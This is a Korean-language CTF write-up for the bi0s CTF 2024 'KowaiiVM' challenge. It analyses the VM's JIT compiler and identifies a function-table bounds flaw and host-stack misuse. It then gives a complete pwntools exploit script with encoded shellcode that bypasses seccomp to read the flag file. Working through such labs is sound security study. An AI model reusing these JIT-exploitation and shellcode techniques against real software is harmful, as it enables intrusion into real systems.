---
title: "Bi0s CTF 2024 - KowaiiVM"
dateString: March 2024
draft: false
tags: ["Bi0s CTF 2024","JIT Exploit"]
weight: 30
date: 2024-03-20
categories: ["CTF"]
# cover:
    # image: ""
---
# Kowaii VM
## Analysis
문제에서 소스코드를 제공해준다.
```
---- 0x0000
Header data
---- 0x1000
.CODE
---- bss >= 0xc000
.BSS
---- 0xffff
```
위와 같은 바이너리 구조를 입력으로 받는다.

```c++
        void prepareCtx()
        {
            this->prepareFuncTable();

            this->regs->bp = (u64 *)mmap(this->genAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
            if(this->regs->bp == (void *)(-1)) error("Unable to map stack!");
            this->regs->bp += (STACK_SIZE)/sizeof(u64);
            this->regs->sp = this->regs->bp;

            this->jitBase = (u8 *)mmap(this->genAddr(), JIT_SIZE, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
            if(this->jitBase == (void *)(-1)) error("Unable to allocate executable memory!");
            this->jitEnd = this->jitBase + JIT_SIZE;

            this->callStackBase = (kowaiiFuncEntry **)mmap(this->genAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
            if(this->callStackBase == (void *)(-1)) error("Unable to map call stack!");
            this->callStack = this->callStackBase;

            this->regs->pc = (u8 *)(this->bin)+this->bin->entry;
            this->bss = ((u8 *)(this->bin)+this->bin->bss);
            mprotect((void *)((u64)this->bin+CODE_START_ADDR), this->bin->bss-CODE_START_ADDR, PROT_READ);
        }
};
```
커스텀 바이너리를 입력으로 받는다.
text, bss 영역이 존재한다.
vm context를 세팅하는 함수가 있는데 stack, jit page, callStack 모두 주소가 랜덤화된다.
vm은 checkState에서 검증을 모두 수행하고 취약점이 발생하지 않는다.
그리고 JIT compile이 활성화되었는지 아닌지에 따라서 callFunc, retFunc가 오버라이딩된다.
```c++
        void virtual callFunc()
        {
            u16 hash = *(u16 *)(this->ctx.regs->pc+1);
            kowaiiFuncEntry *fe = NULL;

            for(int i = 0; i < this->ctx.bin->no_funcs; i++)
            {
                if(hash == this->ctx.bin->funct[i].hash)
                {
                    fe = &this->ctx.bin->funct[i];
                    break;
                }
            }
            if(!fe) error("Invalid function call!");

            if(fe->callCount >= JIT_CC && fe->size >= JIT_MS)
            {
                this->jitCall(fe);
                this->ctx.regs->pc += 3;
                return;
            }

            *(--this->ctx.regs->sp) = (u64)(this->ctx.regs->pc+3);
            this->ctx.regs->pc = (u8 *)fe->addr;
            *(++this->ctx.callStack) = fe;
            return;
        }

        void virtual retFunc()
        {
            this->ctx.regs->pc = (u8 *)(*this->ctx.regs->sp++);
            (*this->ctx.callStack)->callCount++;
            if((*this->ctx.callStack)->callCount >= JIT_CC && (*this->ctx.callStack)->size >= JIT_MS ) this->jitGen(*this->ctx.callStack);
            *(this->ctx.callStack--) = NULL; 
            return;
        }
```
JIT이 활성화된 클래스를 확인해보면 retFunc에서 callStack을 빼면서 callCount를 수집한다.
또한 CallCount를 JIT_CC와 비교해서 네이티브로 컴파일해 최적화를 수행한다.
이미 앞서 vm에서 충분히 검증되었다고 믿고, JIT에선 검증없이 컴파일한다.
```c++
        void jitEmitIns(u64 INS, u16 reg1, u16 reg2, u16 reg3)
        {
            u8 insSize = 0;
            if(INS < (1<<8)) insSize = 0x1;
            else if(INS < (1<<16)) insSize = 0x2;
            else if(INS < (1<<24)) insSize = 0x3;
            else insSize = 0x4;

            *(u64 *)(this->ctx.jitBase) = INS;
            if(reg1 != x64_NOREG)
            {
                if(reg1 < MAX_REGS) reg1 = x64_REG+reg1;
                else reg1 = reg1 & 0x3;
                *(this->ctx.jitBase+insSize-1) += reg1;
            }
            if(reg2 != x64_NOREG)
            {
                if(reg2 < MAX_REGS) reg2 = x64_REG+reg2;
                else reg2 = reg2 & 0x3;
                *(this->ctx.jitBase+insSize-1) += reg2 << 3;
            } 
            if(reg3 != x64_NOREG)
            {
                if(reg3 < MAX_REGS) reg3 = x64_REG+reg3;
                else reg3 = reg3 & 0x3;
                *(this->ctx.jitBase+insSize-2) += reg3 << 3;
            }
            this->ctx.jitBase += insSize;
        }

        void jitGen(kowaiiFuncEntry *fe)
        {
            ...
            mprotect(this->ctx.jitEnd-JIT_SIZE, JIT_SIZE, PROT_READ | PROT_WRITE);

            fe->addr = (u64)this->ctx.jitBase;
            while(i < fe->size)
            {
                if(this->ctx.jitBase >= this->ctx.jitEnd) error("Out of executable memory!");
                kfe = NULL;
                reg1 = code[i+1];
                reg2 = code[i+2];
                reg3 = code[i+3];
                imm = *(u64 *)(code+i+2);
                hash = *(u16 *)(code+i+1);

                switch(code[i])
                {
                    case ADD:

                        if(reg1 != reg2 && reg1 != reg3)
                        {
                            this->jitEmitIns(x64_MOVNN, reg1, reg2, x64_NOREG);
                            this->jitEmitIns(x64_ADD, reg1, reg3, x64_NOREG);
                        }
                        else
                        {
                            if(reg1 == reg2) this->jitEmitIns(x64_ADD, reg1, reg3, x64_NOREG);   
                            else this->jitEmitIns(x64_ADD, reg1, reg2, x64_NOREG);
                        }
                        i += 4;
                        break;
        ...
cleanup:
            *this->ctx.jitBase++ = x64_RET;
            mprotect(this->ctx.jitEnd-JIT_SIZE, JIT_SIZE, PROT_READ | PROT_EXEC);
        }
```
검증없이 set / get oob가 발생할 가능성이 있다.
근데 앞서 최적화되기 전에 검증이 있기 때문에 code가 런타임에 수정되지 않는한 취약하지 않다.
```c++
void prepareFuncTable()
        {
            for(int i = 0; i < this->bin->no_funcs; i++)
            {
                u64 addr = (u64)(this->bin->funct[i].addr);
                
                if(addr > this->bin->bss || addr < CODE_START_ADDR) error("Invalid function table!");
```
근데 앞서 검증할때 code address < this->bin->bss 여야하고, 이에 부정은 code address >= this->bin->bss 이기 때문에 bss 영역에 코드를 작성하고 call hash를 통해 런타임에 수정되는 코드를 만들 수 있다.
### Vulnerability
사실 bss에 쓰기 가능한 코드를 이용해 JIT gen 함수의 취약점을 악용할 필요도 없이 설계상의 문제로도 그냥 익스플로잇이 가능했다.
한번 JIT 컴파일이 되면, push / pop 같은 스택 조작 명령을 통해 실제 레지스터 rip에 대한 컨트롤이 가능하다.
근본적으로 vm에서 host rsp를 그대로 이용하는거 자체가 문제이다.
## Exploit
```c++
        __attribute__((noinline))
        __attribute__((naked))
        void jitCall(kowaiiFuncEntry *fe)
        {
            __asm__(
                "push rbp;"
                "push r8;"
                "push r9;"
                "push r10;"
                "push r11;"
                "push r12;"
                "push r13;"
                "push r14;"
                "push r15;"
                "push rdi;"
                "push rdx;"
                "push rcx;"
                "xor r8, r8;"
                "xor r9, r9;"
                "mov rbp, rsp;"
                "mov rdx, qword ptr [rdi+0x28];"
                "mov rdi, qword ptr [rdi+0x10];"
                "mov r10, qword ptr [rdi];"
                "mov r11, qword ptr [rdi+0x8];"
                "mov r12, qword ptr [rdi+0x10];"
                "mov r13, qword ptr [rdi+0x18];"
                "mov r14, qword ptr [rdi+0x20];"
                "mov r15, qword ptr [rdi+0x28];"
                "mov rsp, qword ptr [rdi+0x38];"
                "call qword ptr [rsi+0x2];"
                "mov qword ptr [rdi], r10;"
                "mov qword ptr [rdi+0x8], r11;"
                "mov qword ptr [rdi+0x10], r12;"
                "mov qword ptr [rdi+0x18], r13;"
                "mov qword ptr [rdi+0x20], r14;"
                "mov qword ptr [rdi+0x28], r15;"
                "mov rsp, rbp;"
                "pop rcx;"
                "pop rdx;"
                "pop rdi;"
                "pop r15;"
                "pop r14;"
                "pop r13;"
                "pop r12;"
                "pop r11;"
                "pop r10;"
                "pop r9;"
                "pop r8;"
                "pop rbp;"
                "ret"
            );
        }
```
근본적으로 call 함수에서 rsp에 직접 vm 스택의 주소가 담기고, 실제로 push / pop / call 을 수행할 수 있다면 JIT page도 릭할 수 있다.
JIT compile된 함수는 이미 JIT compile된 함수만 call이 가능하다.
call 이전에 이미 rsp는 vm stack의 주소로 변경되었으니 이를 이용해 JIT page leak이 가능하다.
그리고 pop ret 가젯을 만들고 push ret 가젯을 만들어서 pop으로 binary base를 구하고 push ret으로 context 복구가 가능하다.
```c++
#ifdef SECCOMP
void kowaiiSeccomp()
{
    scmp_filter_ctx sctx;

    sctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);
    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);
    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0);
    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(sctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

    cout << "[*] Applying seccomp filetrs, no escape ;)" << endl;
    close(STDIN_FILENO);
    if(seccomp_load(sctx)) error("Seccomp error :^(");
}
#endif

```
seccomp bypass를 위해서 JIT에 mov imm32를 통해서 4바이트씩 쉘코드를 작성하고 \\xeb\\x02로 쉘코드를 이었다.

## Exploit
```python
from pwn import *
class COMPILER:
    ADD               =0xb0
    SUB               =0xb1
    MUL               =0xb2
    SHR               =0xb3
    SHL               =0xb4
    PUSH              =0xb5
    POP               =0xb6
    GET               =0xb7
    SET               =0xb8
    MOV               =0xb9
    CALL              =0xba
    RET               =0xbb
    NOP               =0xbc
    HLT               =0xbf


    @staticmethod
    def add(dst, src1, src2):
        payload = b''
        payload += p8(compiler.ADD)
        payload += p8(dst)
        payload += p8(src1)
        payload += p8(src2)
        return payload
    
    @staticmethod
    def sub(dst, src1, src2):
        payload = b''
        payload += p8(compiler.SUB)
        payload += p8(dst)
        payload += p8(src1)
        payload += p8(src2)
        return payload
    
    @staticmethod
    def mov(dst, imm32):
        payload = b''
        payload += p8(compiler.MOV)
        payload += p8(dst)
        payload += p32(imm32)
        return payload
    
    @staticmethod
    def shl(dst, imm8):
        payload = b''
        payload += p8(compiler.SHL)
        payload += p8(dst)
        payload += p8(imm8)
        return payload

    @staticmethod
    def get(dst,imm32):
        payload = b''
        payload += p8(compiler.GET)
        payload += p8(dst)
        payload += p32(imm32) 
        return payload

    @staticmethod
    def set(src,imm32):
        payload = b''
        payload += p8(compiler.SET)
        payload += p8(src)
        payload += p32(imm32)
        return payload

    @staticmethod
    def call(hash):
        payload = b''
        payload += p8(compiler.CALL)
        payload += p16(hash)
        return payload

    @staticmethod
    def ret():
        payload = b''
        payload += p8(compiler.RET)
        return payload

    @staticmethod
    def hlt():
        payload = b''
        payload += p8(compiler.HLT)
        return payload

    @staticmethod
    def push(reg):
        payload = b''
        payload += p8(compiler.PUSH)
        payload += p8(reg)
        return payload

    @staticmethod
    def pop(reg):
        payload = b''
        payload += p8(compiler.POP)
        payload += p8(reg)
        return payload
    
    @staticmethod
    def nop():
        payload = b''
        payload += p8(compiler.NOP)
        return payload

    @staticmethod
    def shl(dst, imm8):
        payload = b''
        payload += p8(compiler.SHL)
        payload += p8(dst)
        payload += p8(imm8)
        return payload
    
class KOWAII:
    CODE_START = 0x1000
    def __init__(self, bss):
        self.funcs = []
        assert bss >= 0xc000
        self.bss = bss
        self.entry = 0
        self.code = b''
        self.bss_data = b''
    
    def set_main(self,code):
        self.entry = len(self.code) + KOWAII.CODE_START
        self.code += code
    
    def add_func(self, code, addr = 0xdeadbeef, sz = 0xdeadbeef):
        assert len(self.funcs) <= 0x80
        if addr == 0xdeadbeef:
            addr = len(self.code)+KOWAII.CODE_START
        if sz == 0xdeadbeef:
            sz = len(code)
        f = {
            'hash' : len(self.funcs),
            'addr' : addr,
            'size' : sz,
            'callCount' : 0,
        }
        self.code += code
        self.funcs.append(f) 
    
    def get_binary(self):
        binary = b'KOWAII'
        binary += p16(self.entry)
        binary += p32(0xdeadc0de)
        binary += p16(self.bss)
        binary += p8(len(self.funcs))
        for i in self.funcs:
            binary += p16(i['hash'])
            binary += p64(i['addr'])
            binary += p8(i['size'])
            binary += p8(i['callCount'])
        binary += b'\x00' * (KOWAII.CODE_START-len(binary)) 
        binary += self.code
        if len(self.bss_data) > 0:
            binary += b'\x00' * (self.bss - len(binary))
            binary += self.bss_data
        return binary  
        
    
    def get_func(self, idx): 
        return self.funcs[idx]

    def set_bss_data(self, data):
        self.bss_data = data
        


if __name__ == '__main__':
    r0,r1,r2,r3,r4,r5 = 0,1,2,3,4,5
    
    kowaii = KOWAII(bss=0xc000)
    compiler = COMPILER()

    pop_func = b''  # JIT_MS = 0xa
    pop_func += compiler.pop(r0) 
    pop_func += compiler.nop() * 0x10
    pop_func += compiler.ret()
    popf = 0

    get_pc = b''  # will not be optimized
    get_pc += compiler.pop(r0)
    get_pc += compiler.set(r0, 0xf00)
    get_pc += compiler.push(r0)
    get_pc += compiler.ret()
    get_pcf = 1

    kowaii.add_func(pop_func)
    kowaii.add_func(get_pc)

    def optimize(func, additional_code_perloop = b'',additional_code_perloop1 = b'' ,JIT_CC = 0xa, JIT_MS = 0xa):
        assert kowaii.get_func(func)['size'] >= JIT_MS
        code = b''
        code += compiler.call(get_pcf)
        code += compiler.get(r5, 0xf00)
        for it in range(JIT_CC):
            code += compiler.mov(r1, 6+(13+len(additional_code_perloop+additional_code_perloop1))*(it+1))
            code += compiler.add(r1,r5,r1)
            code += additional_code_perloop
            code += compiler.call(func)
            code += additional_code_perloop1
        return code

    '''
    - vmpc & r0 ~ r5 can be controlled
    - rip & rax, cl, rdx, r10 ~ r15 can be controlled
    - writable bss can be controlled
    '''
    
    
    # 1) Leak JIT page
    jit_leak = b''
    jit_leak += compiler.nop() * 0x10
    jit_leak += compiler.call(popf)
    jit_leak += compiler.ret()
    jit_leakf = 2
    kowaii.add_func(jit_leak)
 
    main = b''
    main += optimize(jit_leakf, additional_code_perloop1= compiler.push(r1) + compiler.ret()) # popf is already optimized
    # main += optimize(popf, additional_code_perloop = compiler.push(r1)) # already optimized
    main += compiler.call(jit_leakf) 
    main += compiler.mov(r1, 0xf)
    main += compiler.sub(r0, r0, r1)
    main += compiler.set(r0, 0xf08) # bss+0xf08 = JIT page

    # 2) Leak binary base
    # call pop ret -> push ret -> flow recover
    push_ret = compiler.nop() * 0x10
    push_ret += compiler.push(r0)
    push_ret += compiler.ret()
    kowaii.add_func(push_ret)
    pushf = 3
    main += optimize(pushf, additional_code_perloop = compiler.mov(r2,0) + compiler.add(r0,r1,r2))
    main += compiler.mov(r1, 0x10) 
    main += compiler.get(r0, 0xf08) # get JIT
    main += compiler.add(r0, r1, r0) 
    main += compiler.push(r0) # r0 = (push r10; ret)
    main += compiler.call(popf) # return to (push r10; ret) which will recover the context
    main += compiler.mov(r1, 0x4193)
    main += compiler.sub(r0, r0, r1) # get binbase
    main += compiler.set(r0, 0xf10) # bss+0xf10 = binbase

    # 3) write shellcode in JIT 
    # 0x0000000000004b0e : add byte ptr [rax + 0x29], cl ; ret
    # once call opcode is jit compiled and executed, rax always points to the JIT address.
    # and cl register can be controlled using shl opcode 

    # 3) vmpc = bss and modifying imm32 of mov 
    # once SET/GET instruction is jit compiled, bounds check is eliminated
    # if(addr > this->bin->bss || addr < CODE_START_ADDR) error("Invalid function table!");
    # function entry can point to the starting point of bss


    def gen_shellcode(c):
        code = asm(c)
        assert len(code) <= 2
        payload = compiler.mov(0, u32(code.ljust(2,b'\x90') + b'\xeb\x02'))
        return payload

    # context.arch = 'amd64'
    # shellcode = b'' 
    # shellcode += gen_shellcode('xor eax, eax')
    # shellcode += gen_shellcode('inc eax')
    # shellcode += gen_shellcode('inc eax')
    # shellcode += gen_shellcode('push r11') # path
    # shellcode += gen_shellcode('pop rdi')
    # shellcode += gen_shellcode('push 0')
    # shellcode += gen_shellcode('pop rsi')
    # shellcode += gen_shellcode('push 0')
    # shellcode += gen_shellcode('pop rdx')
    # shellcode += gen_shellcode('syscall')

    # shellcode += gen_shellcode('push rax')
    # shellcode += gen_shellcode('pop rdi')
    # shellcode += gen_shellcode('push rsp')
    # shellcode += gen_shellcode('pop rsi')
    # shellcode += gen_shellcode('push 0x7f')
    # shellcode += gen_shellcode('pop rdx')
    # shellcode += gen_shellcode('xor eax, eax')
    # shellcode += gen_shellcode('syscall')

    # shellcode += gen_shellcode('xor eax, eax')
    # shellcode += gen_shellcode('inc eax')
    # shellcode += gen_shellcode('push rsp')
    # shellcode += gen_shellcode('pop rsi')
    # shellcode += gen_shellcode('push 1')
    # shellcode += gen_shellcode('pop rdi')
    # shellcode += gen_shellcode('push 0x7f')
    # shellcode += gen_shellcode('pop rdx')
    # shellcode += gen_shellcode('syscall')
    # shellcode += compiler.ret()
    # print(list(shellcode))
    shellcode = bytes([185, 0, 49, 192, 235, 2, 185, 0, 255, 192, 235, 2, 185, 0, 255, 192, 235, 2, 185, 0, 65, 83, 235, 2, 185, 0, 95, 144, 235, 2, 185, 0, 106, 0, 235, 2, 185, 0, 94, 144, 235, 2, 185, 0, 106, 0, 235, 2, 185, 0, 90, 144, 235, 2, 185, 0, 15, 5, 235, 2, 185, 0, 80, 144, 235, 2, 185, 0, 95, 144, 235, 2, 185, 0, 84, 144, 235, 2, 185, 0, 94, 144, 235, 2, 185, 0, 106, 127, 235, 2, 185, 0, 90, 144, 235, 2, 185, 0, 49, 192, 235, 2, 185, 0, 15, 5, 235, 2, 185, 0, 49, 192, 235, 2, 185, 0, 255, 192, 235, 2, 185, 0, 84, 144, 235, 2, 185, 0, 94, 144, 235, 2, 185, 0, 106, 1, 235, 2, 185, 0, 95, 144, 235, 2, 185, 0, 106, 127, 235, 2, 185, 0, 90, 144, 235, 2, 185, 0, 15, 5, 235, 2, 187])

    kowaii.add_func(shellcode)
    shellcodef = 4
    kowaii.set_bss_data(b'./flag.txt')

    main += optimize(shellcodef)
    main += compiler.get(r0, 0xf08) # get JIT
    main += compiler.mov(r1, 0x15)
    main += compiler.add(r0, r0, r1)
    main += compiler.push(r0)*0x20
    main += compiler.push(r0)
    main += compiler.get(r0, 0xf00) # get bss
    main += compiler.mov(r1,0xad45)
    main += compiler.add(r1,r0,r1)
    main += compiler.shl(r5,0xf)
    main += compiler.call(popf)
    main += compiler.hlt()

    # shellcode start jit + 0x15

    kowaii.set_main(main)

    binary = kowaii.get_binary()
    
    p = process('./out.bin',env={"LD_mainLOAD":"./libm.so.6 ./libseccomp.so.2"})
    p.sendafter(b'binary',binary+b'\x0a'*2)

    pause()
    p.sendlineafter(b'mode?',b'y')
    
    p.interactive()
```
